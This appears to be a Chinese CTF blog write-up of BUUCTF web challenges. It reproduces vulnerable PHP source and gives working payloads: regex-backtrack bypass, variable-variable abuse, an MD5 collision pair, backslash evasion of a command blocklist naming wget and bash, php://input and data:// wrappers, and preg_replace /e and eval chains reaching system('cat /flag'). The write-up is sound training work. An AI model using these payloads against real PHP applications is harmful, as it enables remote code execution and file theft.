<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/02-1711388632881.png"></p>
<p>中英不一样（以英文版为主，上限默认是100万次）</p>
<p>如果回溯次数超过上限 &#x3D;&gt; 返回false</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://21f64b23-2c68-4e4c-9a97-3a552fe3e8d7.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;haha&quot;:&quot;&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div>

<h2 id="BJDCTF2020-Mark-loves-cat-git泄露-可变变量"><a href="#BJDCTF2020-Mark-loves-cat-git泄露-可变变量" class="headerlink" title="[BJDCTF2020]Mark loves cat [.git泄露 - 可变变量]"></a>[BJDCTF2020]Mark loves cat [.git泄露 - 可变变量]</h2><p><strong>.git泄露</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/4-7-00.png"></p>
<p><strong>flag.php</strong>内不是flag，<code>$flag = file_get_contents(&#39;/flag&#39;);</code> &#x3D;&#x3D;&#x3D;&gt; flag变量中保存了flag值</p>
<p><strong>index.php</strong>中有一段php代码</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123; <span class="comment"># $x是键名 $y是对应键值</span></span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>; <span class="comment"># POST：a=flag =&gt; $a = flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>; <span class="comment"># GET：a=flag =&gt; $a = $flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>1.利用<code>exit($handsome)</code></strong></p>
<p>Payload：<code>url/index.php?handsome=flag&amp;flag=a&amp;a=flag</code></p>
<p>-&gt; 利用exit()函数输出flag，肯定是要先将handsome指向flag变量的</p>
<p>-&gt; 前提是满足这个if语句，GET方法的传参</p>
<p>-&gt; GET方法就会在前面引起 <code>foreach($_GET as $x =&gt; $y)</code></p>
<p>-&gt; 故 flag&#x3D;a&amp;a&#x3D;flag  -&gt; <code>if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)</code> </p>
<p>&#x3D;&#x3D;&gt; a &#x3D; a &amp;&amp; a !&#x3D;&#x3D; ‘flag’ 满足</p>
<p> <strong>2.利用<code>exit($yds);</code></strong></p>
<p>Payload：<code>url/index.php?yds=flag</code></p>
<p>-&gt; 由于用到了GET方法，会GET的foreach遍历</p>
<p>-&gt; $yds &#x3D; $flag 且满足if语句，且能够输出flag</p>
<p><strong>3.利用<code>exit($is);</code></strong></p>
<p>Payload：<code>url/index.php?is=flag&amp;flag=flag</code></p>
<p>-&gt; 肯定的首先是 is&#x3D;flag</p>
<p>-&gt; 要想进入这个if，肯定存在一个GET或POST方法传入的flag&#x3D;flag</p>
<p>-&gt; GET：flag&#x3D;flag 还是会经历foreach的GET遍历</p>
<p>&#x3D;&gt; $flag &#x3D; $flag</p>
<p>-&gt; 接上前面的is&#x3D;flag &#x3D;&gt; $is &#x3D; $flag&#x3D;$flag</p>
<p><strong>4.利用<code>echo &quot;the flag is: &quot;.$flag;</code></strong></p>
<p>Payload：<code>1=flag&amp;flag=1</code></p>
<p>-&gt; 不进入两个if语句，</p>
<p>-&gt; 这里用到的是 <code>1=flag&amp;flag=1</code></p>
<p><strong>-&gt; 具体为什么这样可以我也不知道。</strong></p>
<p>-&gt; 看别人写的说的是当经过foreach遍历时，1作为变量是 类型是int，flag是字符串，类型不一样所以不满足if语句</p>
<p>还是要多想想。</p>
<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>打开题目，先抓包看看 -&gt; 两个参数img(base64编码) cmd 图片通过base64编码的格式进行传输.</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web00.png" alt="00"></p>
<p>看别人的Wp 第一次知道Bp中的Decoder模块（挺好用），不过Bp中base64解码不会主动补齐位数，导致数据上有偏差</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web02.png" alt="02"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web01.png" alt="01"></p>
<p>也就是说，<code>这里的img参数是 555.png 经过 base16加密一次，再进行base64加密两次之后的数据  </code></p>
<p>-&gt; 对img传入的参数 要进行一次base16编码和两次base64编码和</p>
<p>Bp返回包是img参数的base64编码形式</p>
<p>没什么思路，我们先看index.php中的内容（按照img传参的要求，进行编码再传值）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web03.png" alt="03"></p>
<p>对返回的内容base64解码得到index.php的源码</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);    </span><br><span class="line"><span class="comment">//header函数实现了页面的刷新和重定向，</span></span><br><span class="line"><span class="comment">//Refresh:0: 这表示浏览器应在加载页面后立即刷新。数字 0 表示无延迟，即立即刷新。</span></span><br><span class="line"><span class="comment">//url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=: 这是指定刷新后跳转的目标 URL。在这里，它是相对于当前目录的     ./index.php，并带有两个参数，即 img 和 cmd。</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));              </span><br><span class="line"><span class="comment">//对传入的img参数进行base64解码两次，最后来一个16进制转换为2进制数据。所以我们传参需要 1.16进制转化 2.base64加密两次</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);      </span><br><span class="line"><span class="comment">// 对file参数（img解密后）进行字符串替换-&gt;将字母和数字替换为空白</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;     <span class="comment">// preg_match匹配函数，$file中如果有flag 返回1 没有就返回0 /i -&gt;不区分大小写</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`; 			<span class="comment">// ``内部包含系统命令</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ol>
<li><p>header函数	-&gt; 用于发送原始的HTTP头信息，用于在服务器发送页面之前发送一些特定的HTTP头.</p>
</li>
<li><p>file参数的过滤    -&gt; 首先是替换函数，将字母和数字全部替换为空白 然后是不能出现flag    &#x2F;i-&gt; 不区分大小写.</p>
</li>
<li><p>cmd参数的过滤    </p>
</li>
<li><p>md5强转换为string类型的绕过</p>
</li>
</ol>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.的绕过（这只是一个，网上还可以搜到其他的）</span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></div>



<p>$file 和 $cmd -&gt; file无法直接读取flag文件，也没必要，我们可以直接 通过cmd来获得flag内容</p>
<p>也就是要绕过cmd的过滤.</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ol>
<li>与cat同种效果的指令很多，uniq是其中之一。</li>
<li>\可以绕过</li>
</ol>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web04.png" alt="04"></p>
<p><strong>反斜杠</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web06.png" alt="06"></p>
<blockquote>
<p>也就是说-&gt;在正则表达式中 三个反斜杠才代表过滤的是\，所以这里还可以通过\绕过</p>
<p>ls -&gt; l\s</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web08.png" alt="08"></p>
<p>1.flag在根目录下，因为当前目录下没有flag（根目录下很常见）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web07.png" alt="07"></p>
<p><strong>2.传参为什么要将空格表示为%20（url编码）      直接用空格是不对的。</strong> </p>
<p>3.php中对于\的输出 -&gt; 可以得到 奇数个报错，偶数个输出一半</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/easy_web05.png" alt="05"></p>
<h2 id="ZJCTF-不过如此"><a href="#ZJCTF-不过如此" class="headerlink" title="ZJCTF 不过如此"></a>ZJCTF 不过如此</h2><p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/ZJCTF00.png" alt="00"></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>1.使用php:&#x2F;&#x2F;input</p>
<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。<strong>当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
<p><strong>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。</strong></p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/ZJCTF01.png" alt="01"></p>
<blockquote>
<p>2.使用data协议</p>
<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，<strong>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/ZJCTF02.png" alt="02"></p>
<p>next.php的内容</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>1.preg_replace()的&#x2F;e模式存在命令执行漏洞		&#x2F;e -&gt; 可执行模式，此为PHP专有参数，例如preg_replace函数.</strong></p>
<p><strong>知识学习</strong>（低版本php存在，新版本的php已经启用&#x2F;e）</p>
<p><a class="link" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://blog.csdn.net/qq_20408491/article/details/75095055">https://blog.csdn.net/qq_20408491/article/details/75095055 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
<p> <strong>replacement</strong>可以包含\n形式或$n形式的逆向引用，n可以为0到99，\n表示匹配pattern第n个子模式的文本，\0表示匹配整个pattern的文本</p>
</blockquote>
<p><strong><code>\1</code> 在正则表达式中有自己的含义，</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line"></span><br><span class="line">这里的 \1 实际上是匹配第一个子匹配项,我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*=&#123;$&#123;phpinfo()&#125;&#125; ，即 GET 方式传入的参数名为 /?.* ，值为 &#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure></div>

<p><strong>2.此处由GET方法传入值，而GET方法传参时 -&gt; 当首字母为点号时，会被替换为下划线.</strong></p>
<blockquote>
<p><strong>\S*&#x3D;${phpinfo()}</strong></p>
<p>\S 匹配任何非空白字符</p>
</blockquote>
<p><strong>3.PHP可变变量</strong></p>
<p><code>payload \S\*=$&#123;phpinfo()&#125;</code></p>
<blockquote>
<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
</blockquote>
<p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="思路一：-GET方法传参"><a href="#思路一：-GET方法传参" class="headerlink" title="思路一： [ GET方法传参 ]"></a>思路一： [ GET方法传参 ]</h4><p>最后有一个eval函数 &#x3D;&gt; eval($_GET[1])</p>
<p>-&gt; 用白名单中的函数，绕过黑名单，变换到目标代码</p>
<p>-&gt; base_convert()函数 [ 进制转换 ]</p>
<p>-&gt; hex2bin [ 将十六进制数字转换为字节数据 ]</p>
<p>-&gt; dechex [ 将十进制数字转换为十六进制 ]</p>
<p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac /flag</code></p>
